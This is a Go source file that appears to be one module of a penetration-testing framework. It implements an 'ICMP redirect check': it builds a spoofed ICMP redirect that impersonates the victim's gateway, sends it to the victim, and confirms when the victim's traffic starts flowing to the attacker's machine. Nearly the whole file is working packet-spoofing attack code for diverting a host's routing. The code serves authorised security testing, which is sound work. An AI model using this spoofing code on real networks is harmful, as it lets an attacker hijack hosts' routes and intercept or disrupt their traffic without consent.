// icmpredirect.go implements the ICMP redirect check. Impact temporary,
// restore decay with no stated bound, affects clients: the redirect (type
// 5, code 1) points the victim's route cache at the attack leg, and the
// victim drops the entry on its own route cache timer. The behavior does
// not enable host forwarding, so the redirected traffic is not relayed.

package fh

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type icmpRedirectFinding struct {
	Action   string `json:"action"`
	Gateway  string `json:"gateway"`
	Targets  string `json:"targets"`
	Redirect string `json:"redirect"`
}

// RunICMPRedirect sends one redirect to the target's victim, spoofed from
// the target's gateway, naming the attack leg's own IPv4 as the better
// hop for the quoted datagram's destination, which is probe content. The
// predicate is a frame from the victim's MAC to the attack leg's MAC whose
// IPv4 destination is that address: one within the window confirms that
// the victim routes it through the attacker, and silence is pending,
// since the victim sends to that destination on its own schedule.
func RunICMPRedirect(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC, check.FieldGateway); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	srcGW := deps.Target.Gateway.IP
	victim := deps.Target.Victim
	redirectGW := addr.IPv4
	origDst := net.IPv4(8, 8, 8, 8)

	pkt, err := craftICMPRedirect(addr.MAC, victim, srcGW, redirectGW, origDst)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "icmpredirect: craft redirect")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "icmpredirect: send redirect")
	}

	detail, _ := json.Marshal(icmpRedirectFinding{
		Action:   "icmp-redirect",
		Gateway:  srcGW.String(),
		Targets:  victim.IP.String(),
		Redirect: redirectGW.String(),
	})
	deps.Emitter.Finding("icmp", detail)

	found, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		return isRoutedThrough(data, victim.MAC, addr.MAC, origDst)
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "icmpredirect: receive victim traffic")
	}
	if found != nil {
		return check.Confirmed(fmt.Sprintf("the victim routes %s through the attack leg", origDst), obs.Elapsed), nil
	}
	return check.Pending(fmt.Sprintf("the victim sends to %s on its own schedule: nothing in %s", origDst, obs.Elapsed.Round(time.Millisecond))), nil
}

// isRoutedThrough reports whether data is an IPv4 datagram from the
// victim's MAC to the attack leg's MAC whose destination is dst, the
// traffic a redirect taken sends through the attacker.
func isRoutedThrough(data []byte, victim, leg net.HardwareAddr, dst net.IP) bool {
	pkt := decodeFrame(data)
	eth, ip := ethernetOf(pkt), ipv4Of(pkt)
	if eth == nil || ip == nil {
		return false
	}
	return bytes.Equal(eth.SrcMAC, victim) && bytes.Equal(eth.DstMAC, leg) && ip.DstIP.Equal(dst)
}

// craftICMPRedirect builds an ICMP redirect: Ethernet → IPv4 → ICMP(type=5,
// code=1) → redirect gateway + original datagram.
func craftICMPRedirect(src net.HardwareAddr, victim check.Host, srcGW, redirectGW, origDst net.IP) ([]byte, error) {
	dstVictim := victim.IP
	eth := &layers.Ethernet{
		DstMAC:       victim.MAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolICMPv4,
		SrcIP:    srcGW,
		DstIP:    dstVictim,
	}
	icmp := &layers.ICMPv4{
		TypeCode: 0x0501, // type=5 (redirect), code=1 (redirect for host)
	}
	// ICMP redirect body: gateway address (4) + original IP header + 64 bits.
	origIPHdr := make([]byte, 20)
	origIPHdr[0] = 0x45
	origIPHdr[9] = 17
	copy(origIPHdr[12:16], srcGW.To4())
	copy(origIPHdr[16:20], origDst.To4())
	// Redirect gateway address first, then original datagram (IP header +
	// 64 bits of UDP header).
	origUDP := []byte{0, 0, 0, 53, 0, 8, 0, 0}
	redirectGWBytes := redirectGW.To4()
	payload := make([]byte, 0, len(redirectGWBytes)+len(origIPHdr)+len(origUDP))
	payload = append(payload, redirectGWBytes...)
	payload = append(payload, origIPHdr...)
	payload = append(payload, origUDP...)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializeLayers(buf, opts, eth, ip, icmp, gopacket.Payload(payload)); err != nil {
		return nil, err
	}
	return append([]byte(nil), buf.Bytes()...), nil
}
